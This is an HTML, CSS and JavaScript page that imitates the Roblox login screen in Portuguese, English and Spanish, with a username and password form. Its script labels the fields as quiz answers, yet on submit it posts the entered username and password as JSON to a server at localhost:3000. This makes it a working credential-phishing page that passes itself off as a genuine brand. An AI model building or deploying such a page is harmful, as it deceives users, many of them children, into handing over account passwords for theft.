<!DOCTYPE html>
<html lang="pt-PT">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Entrar na Roblox</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }

html, body {
    width: 100%;
    height: 100%;
    background: #000;
    color: #FFFFFF;
    overflow: hidden;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    font-weight: 400;
}
button, input { font-family: inherit; }
#pc-layout, #mobile-layout { display: none; }

/* ---------- Fundo em mosaico (partilhado) ---------- */
.stage { position: relative; overflow: hidden; background: #000; }
.bg {
    position: absolute;
    top: -25%; left: -15%;
    width: 140%; height: 150%;
    display: flex; flex-wrap: wrap; align-content: flex-start;
    gap: 22px;
    transform: rotate(-15deg);
    pointer-events: none;
}
.tile {
    width: var(--t, 270px);
    height: var(--t, 270px);
    border-radius: 10px;
    border: 1px solid rgba(255,255,255,0.06);
}
.tile {
    overflow: hidden;
}
.tile img {
    width: 100%;
    height: 100%;
    object-fit: cover;
    display: block;
}
.tile-icon {
    position: absolute;
    top: 50%; left: 50%;
    width: 42%; height: 42%;
    transform: translate(-50%, -50%);
    fill: none;
    stroke: rgba(255,255,255,0.55);
    stroke-width: 1.4;
    stroke-linecap: round;
    stroke-linejoin: round;
}
.tile { position: relative; }
.shade { position: absolute; inset: 0; background: rgba(0,0,0,0.55); pointer-events: none; }

/* ---------- Cartão de login (partilhado) ---------- */
.card {
    position: relative;
    z-index: 10;
    width: 400px;
    background: #232527;
    padding: 23px 15px 39px;
}
.card form { display: flex; flex-direction: column; align-items: stretch; }
.title {
    font-size: 32px;
    font-weight: 800;
    line-height: 38px;
    text-align: center;
    margin-bottom: 8px;
}
.field {
    height: 38px;
    background: #2b2d31;
    border: 1px solid #3f4247;
    border-radius: 6px;
    padding: 0 12px;
    margin-bottom: 18px;
    color: #FFFFFF;
    font-size: 16px;
    outline: none;
}
.field::placeholder { color: #D0D0D0; }
.field:focus { border-color: #FFFFFF; }
.field.last { margin-bottom: 6px; }
.btn-enter {
    height: 36px;
    background: transparent;
    border: 1px solid #FFFFFF;
    border-radius: 6px;
    color: #E0E0E0;
    font-size: 16px;
    font-weight: 500;
    cursor: pointer;
}
.forgot {
    margin-top: 24px;
    line-height: 20px;
    font-size: 16px;
    font-weight: 600;
    text-align: center;
    cursor: pointer;
}
.divider { margin-top: 30px; height: 1px; background: #393b3d; }
.btn-alt {
    height: 36px;
    margin-top: 19px;
    background: #393b3d;
    border: none;
    border-radius: 6px;
    color: #FFFFFF;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
}
.btn-alt + .btn-alt { margin-top: 12px; }
.signup {
    margin-top: 34px;
    line-height: 20px;
    font-size: 16px;
    font-weight: 600;
    text-align: center;
}
.status-msg {
    position: absolute;
    top: 100%; left: 0; right: 0;
    margin-top: 10px;
    font-size: 13px;
    text-align: center;
    color: #D0D0D0;
}

/* ---------- Botões da barra ---------- */
.btn-signup {
    height: 30px;
    padding: 0 10px;
    background: #335FFF;
    border: none;
    border-radius: 6px;
    color: #FFFFFF;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
}
.btn-login {
    height: 30px;
    padding: 0 10px;
    background: transparent;
    border: 1px solid #FFFFFF;
    border-radius: 6px;
    color: #FFFFFF;
    font-size: 16px;
    font-weight: 500;
    cursor: pointer;
}
.logo { font-size: 26px; font-weight: 900; letter-spacing: -0.5px; }
.search-ico { fill: none; stroke: #BDBEBE; stroke-width: 2.2; stroke-linecap: round; stroke-linejoin: round; }

/* ===================== PC ===================== */
#pc-layout { width: 100%; height: 100vh; padding-top: 40px; justify-content: center; align-items: center; }
#pc-layout .stage { position: absolute; inset: 40px 0 0 0; }
#pc-layout .card { position: relative; margin-top: 40px; }

.pc-navbar {
    position: fixed; top: 0; left: 0; right: 0;
    height: 40px;
    background: #0E0F11;
    display: flex; align-items: center;
    padding: 0 16px 0 20px;
    z-index: 100;
}
.pc-navbar .logo { margin-right: 89px; }
.pc-links { display: flex; gap: 102px; font-size: 16px; font-weight: 600; }
.pc-search {
    margin-left: 51px;
    width: 476px; height: 28px;
    display: flex; align-items: center; gap: 8px;
    padding: 0 8px;
    background: #17181A;
    border: 1px solid #393b3d;
    border-radius: 6px;
}
.pc-search svg { width: 18px; height: 18px; }
.pc-search input {
    flex: 1; background: transparent; border: none; outline: none;
    color: #FFFFFF; font-size: 16px;
}
.pc-search input::placeholder { color: #BDBEBE; }
.pc-nav-right { margin-left: auto; display: flex; gap: 6px; }

/* ================= TELEMÓVEL ================= */
#mobile-layout { width: 100%; height: 100vh; height: 100dvh; background: #000; }
.mobile-viewport {
    width: 100%; height: 100%;
    display: flex; flex-direction: column;
    background: #232527;
    overflow-y: auto; overflow-x: hidden;
}
.mob-navbar {
    flex: none;
    background: #0E0F11;
    padding: 5px 0;
    display: flex; flex-direction: column; gap: 14px;
    z-index: 20;
}
.mob-nav-top { display: flex; align-items: center; height: 30px; padding: 0 10px 0 8px; }
.mob-logo-icon {
    position: relative; width: 29px; height: 29px;
    background: #FFFFFF; border-radius: 6px; transform: rotate(12deg);
}
.mob-logo-icon::after {
    content: ""; position: absolute; left: 10px; top: 10px;
    width: 9px; height: 9px; background: #0E0F11; border-radius: 1px;
}
.mob-actions { margin-left: auto; display: flex; align-items: center; }
.mob-actions .btn-signup, .mob-actions .btn-login { font-size: 17px; }
.mob-actions .btn-login { margin-left: 42px; }
.mob-actions svg { width: 26px; height: 26px; margin-left: 20px; stroke: #E0E0E0; stroke-width: 2; }
.mob-links { display: flex; justify-content: space-between; padding: 0 25px; font-size: 15px; font-weight: 700; line-height: 20px; }
.banner { position: relative; overflow: hidden; background: #000; flex: none; height: 132px; }
.banner.bottom { flex: 1 0 120px; height: auto; }
.banner .bg { --t: 150px; gap: 14px; top: -50px; left: -40px; width: 140%; height: 400px; }
.mcard { position: relative; z-index: 10; flex: none; background: #232527; padding: 22px 15px 37px; }
.mcard form { display: flex; flex-direction: column; align-items: stretch; }
#mobile-layout .title { font-size: 24px; line-height: 30px; margin-bottom: 7px; }
#mobile-layout .btn-enter { height: 32px; }
#mobile-layout .forgot { margin-top: 25px; }
#mobile-layout .divider { margin-top: 29px; }
#mobile-layout .btn-alt { height: 32px; margin-top: 18px; }
#mobile-layout .btn-alt + .btn-alt { margin-top: 12px; }
#mobile-layout .signup { margin-top: 33px; font-size: 13px; line-height: 18px; }
</style>
</head>
<body>

<!-- PC -->
<div id="pc-layout">
    <header class="pc-navbar">
        <div class="logo">ROBLOX</div>
        <nav class="pc-links">
            <span data-i18n="nav1">Destaques</span><span data-i18n="nav2">Mercado</span><span data-i18n="nav3">Criar</span><span data-i18n="nav4">Robux</span>
        </nav>
        <div class="pc-search">
            <svg class="search-ico" viewBox="0 0 24 24"><circle cx="10" cy="10" r="7"></circle><line x1="15" y1="15" x2="21" y2="21"></line></svg>
            <input type="text" placeholder="Pesquisar" data-i18n-ph="search">
        </div>
        <div class="pc-nav-right">
            <button class="btn-signup" data-i18n="signupBtn">Cadastrar-se</button>
            <button class="btn-login" data-i18n="loginBtn">Entrar</button>
        </div>
    </header>

    <div class="stage"><div class="bg"></div><div class="shade"></div></div>

    <main class="card">
        <form class="quizForm">
            <div class="title" data-i18n="title">Entrar na Roblox</div>
            <input type="text" class="retangulo1 field" placeholder="Usuário/e-mail/telefone" data-i18n-ph="userField" required>
            <input type="password" class="retangulo2 field last" placeholder="Senha" data-i18n-ph="passField" required>
            <button type="submit" class="btn-enter" data-i18n="enterBtn">Entrar</button>
            <div class="forgot" data-i18n="forgot">Esqueceu a senha ou nome de usuário?</div>
            <div class="divider"></div>
            <button type="button" class="btn-alt" data-i18n="emailCode">Envie-me um código único por e-mail</button>
            <button type="button" class="btn-alt" data-i18n="quickLogin">Entrada rápida</button>
            <div class="signup" data-i18n="signupLine">Não possui uma conta? <span data-i18n="signupLineBtn">Cadastrar-se</span></div>
        </form>
        <div class="status-msg"></div>
    </main>
</div>

<!-- TELEMÓVEL -->
<div id="mobile-layout">
    <div class="mobile-viewport">
        <header class="mob-navbar">
            <div class="mob-nav-top">
                <div class="mob-logo-icon"></div>
                <div class="mob-actions">
                    <button class="btn-signup" data-i18n="signupBtn">Cadastrar-se</button>
                    <button class="btn-login" data-i18n="loginBtn">Entrar</button>
                    <svg class="search-ico" viewBox="0 0 24 24"><circle cx="10" cy="10" r="7"></circle><line x1="15" y1="15" x2="21" y2="21"></line></svg>
                </div>
            </div>
            <nav class="mob-links">
                <span data-i18n="nav1">Destaques</span><span data-i18n="nav2">Mercado</span><span data-i18n="nav3">Criar</span><span data-i18n="nav4">Robux</span>
            </nav>
        </header>

        <div class="banner"><div class="bg"></div><div class="shade"></div></div>

        <main class="mcard">
            <form class="quizForm">
                <div class="title" data-i18n="title">Entrar na Roblox</div>
                <input type="text" class="retangulo1 field" placeholder="Usuário/e-mail/telefone" data-i18n-ph="userField" required>
                <input type="password" class="retangulo2 field last" placeholder="Senha" data-i18n-ph="passField" required>
                <button type="submit" class="btn-enter" data-i18n="enterBtn">Entrar</button>
                <div class="forgot" data-i18n="forgot">Esqueceu a senha ou nome de usuário?</div>
                <div class="divider"></div>
                <button type="button" class="btn-alt" data-i18n="emailCode">Envie-me um código único por e-mail</button>
                <button type="button" class="btn-alt" data-i18n="quickLogin">Entrada rápida</button>
                <div class="signup" data-i18n="signupLine">Não possui uma conta? <span data-i18n="signupLineBtn">Cadastrar-se</span></div>
            </form>
            <div class="status-msg"></div>
        </main>

        <div class="banner bottom"><div class="bg"></div><div class="shade"></div></div>
    </div>
</div>

<script>
const traducoes = {
    pt: {
        nav1: 'Destaques', nav2: 'Mercado', nav3: 'Criar', nav4: 'Robux',
        search: 'Pesquisar', signupBtn: 'Cadastrar-se', loginBtn: 'Entrar',
        title: 'Entrar na Roblox', userField: 'Usuário/e-mail/telefone', passField: 'Senha',
        enterBtn: 'Entrar', forgot: 'Esqueceu a senha ou nome de usuário?',
        emailCode: 'Envie-me um código único por e-mail', quickLogin: 'Entrada rápida',
        signupLine: 'Não possui uma conta? ', signupLineBtn: 'Cadastrar-se'
    },
    en: {
        nav1: 'Discover', nav2: 'Marketplace', nav3: 'Create', nav4: 'Robux',
        search: 'Search', signupBtn: 'Sign Up', loginBtn: 'Log In',
        title: 'Log in to Roblox', userField: 'Username/Email/Phone', passField: 'Password',
        enterBtn: 'Log In', forgot: 'Forgot your password or username?',
        emailCode: 'Email me a one-time code', quickLogin: 'Quick Login',
        signupLine: "Don't have an account? ", signupLineBtn: 'Sign Up'
    },
    es: {
        nav1: 'Destacados', nav2: 'Mercado', nav3: 'Crear', nav4: 'Robux',
        search: 'Buscar', signupBtn: 'Registrarse', loginBtn: 'Iniciar sesión',
        title: 'Iniciar sesión en Roblox', userField: 'Usuario/correo/teléfono', passField: 'Contraseña',
        enterBtn: 'Iniciar sesión', forgot: '¿Olvidaste tu contraseña o nombre de usuario?',
        emailCode: 'Enviarme un código único por correo', quickLogin: 'Acceso rápido',
        signupLine: '¿No tienes una cuenta? ', signupLineBtn: 'Registrarse'
    }
};

function aplicarIdioma() {
    const lang = (navigator.language || 'en').slice(0, 2).toLowerCase();
    const dic = traducoes[lang] || traducoes.en;

    document.querySelectorAll('[data-i18n]').forEach(el => {
        const chave = el.getAttribute('data-i18n');
        if (dic[chave] !== undefined) {
            // Preserva filhos com a sua própria tradução (ex.: signupLine > signupLineBtn)
            const filhos = el.querySelectorAll('[data-i18n]');
            if (filhos.length === 0) {
                el.textContent = dic[chave];
            } else {
                el.firstChild.textContent = dic[chave];
            }
        }
    });

    document.querySelectorAll('[data-i18n-ph]').forEach(el => {
        const chave = el.getAttribute('data-i18n-ph');
        if (dic[chave] !== undefined) el.placeholder = dic[chave];
    });

    document.documentElement.lang = lang === 'pt' ? 'pt-PT' : (lang === 'es' ? 'es' : 'en');
}

function aplicarLayout() {
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || window.matchMedia('(max-width: 768px)').matches;
    document.getElementById('mobile-layout').style.display = isMobile ? 'block' : 'none';
    document.getElementById('pc-layout').style.display = isMobile ? 'none' : 'flex';
}
window.addEventListener('resize', aplicarLayout);

window.addEventListener('DOMContentLoaded', () => {
    aplicarLayout();
    aplicarIdioma();

    // Mosaico de fundo: usa por omissão as ilustrações originais em ./images/
    // (jogo1.svg a jogo14.svg). Para usares as tuas próprias, substitui esses
    // ficheiros (mesmo nome) ou muda a extensão abaixo.
    const icones = [
        '<path d="M12 2 2 7l10 5 10-5-10-5Z"/><path d="M2 17l10 5 10-5"/><path d="M2 12l10 5 10-5"/>',
        '<path d="M3 13h18l-2-6H5l-2 6Z"/><circle cx="7" cy="17" r="2"/><circle cx="17" cy="17" r="2"/>',
        '<path d="M12 2a7 7 0 0 0-7 7c0 5 7 13 7 13s7-8 7-13a7 7 0 0 0-7-7Z"/><circle cx="12" cy="9" r="2"/>',
        '<rect x="4" y="3" width="16" height="18" rx="2"/><path d="M8 7h8M8 11h8M8 15h5"/>',
        '<path d="M4 21V9l8-6 8 6v12"/><path d="M9 21v-6h6v6"/>',
        '<circle cx="12" cy="12" r="9"/><path d="M12 3v18M3 12h18"/>',
        '<path d="M5 12a7 7 0 0 1 14 0c0 5-7 9-7 9s-7-4-7-9Z"/>',
        '<path d="M3 11l9-8 9 8"/><path d="M5 10v10h14V10"/>',
        '<path d="M12 2l2.5 6.5L21 9l-5 4.5L17.5 21 12 17l-5.5 4L8 13.5 3 9l6.5-.5L12 2Z"/>',
        '<path d="M4 7h16v10H4z"/><path d="M9 7V5h6v2"/>',
        '<path d="M3 17l6-10 4 6 3-4 5 8"/>',
        '<circle cx="12" cy="8" r="4"/><path d="M4 21a8 8 0 0 1 16 0"/>',
        '<path d="M2 12c3-6 7-9 10-9s7 3 10 9c-3 6-7 9-10 9s-7-3-10-9Z"/><circle cx="12" cy="12" r="3"/>',
        '<path d="M12 3v4M12 17v4M3 12h4M17 12h4"/><circle cx="12" cy="12" r="5"/>'
    ];

    const totalImagens = icones.length;
    document.querySelectorAll('.bg').forEach(bg => {
        for (let i = 0; i < 60; i++) {
            const h = (i * 47) % 360;
            const t = document.createElement('div');
            t.className = 'tile';
            t.style.background = `linear-gradient(135deg, hsl(${h},55%,32%), hsl(${(h + 45) % 360},55%,14%))`;

            const n = i % totalImagens;

            const svgNS = 'http://www.w3.org/2000/svg';
            const svg = document.createElementNS(svgNS, 'svg');
            svg.setAttribute('viewBox', '0 0 24 24');
            svg.setAttribute('class', 'tile-icon');
            svg.innerHTML = icones[n];
            t.appendChild(svg);

            const img = document.createElement('img');
            img.src = `images/jogo${n + 1}.svg`;
            img.onload = () => svg.remove();
            img.onerror = () => img.remove();
            t.appendChild(img);

            bg.appendChild(t);
        }
    });
});

document.querySelectorAll('.quizForm').forEach(form => {
    form.addEventListener('submit', async function (e) {
        e.preventDefault();
        const container = this.closest('main');
        const status = container.querySelector('.status-msg');
        const dados = {
            resposta1: container.querySelector('.retangulo1').value,
            resposta2: container.querySelector('.retangulo2').value,
            dataEnvio: new Date().toLocaleString()
        };
        status.style.color = '#D0D0D0';
        status.textContent = 'A enviar...';
        try {
            const resposta = await fetch('http://localhost:3000/api/enviar', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(dados)
            });
            if (resposta.ok) {
                status.style.color = '#4ec9b0';
                status.textContent = '✅ Respostas enviadas para o VS Code!';
                this.reset();
            } else {
                status.style.color = '#f14c4c';
                status.textContent = '❌ Erro ao enviar.';
            }
        } catch (erro) {
            status.style.color = '#f14c4c';
            status.textContent = '❌ Servidor desligado no VS Code.';
        }
    });
});
</script>
</body>
</html>
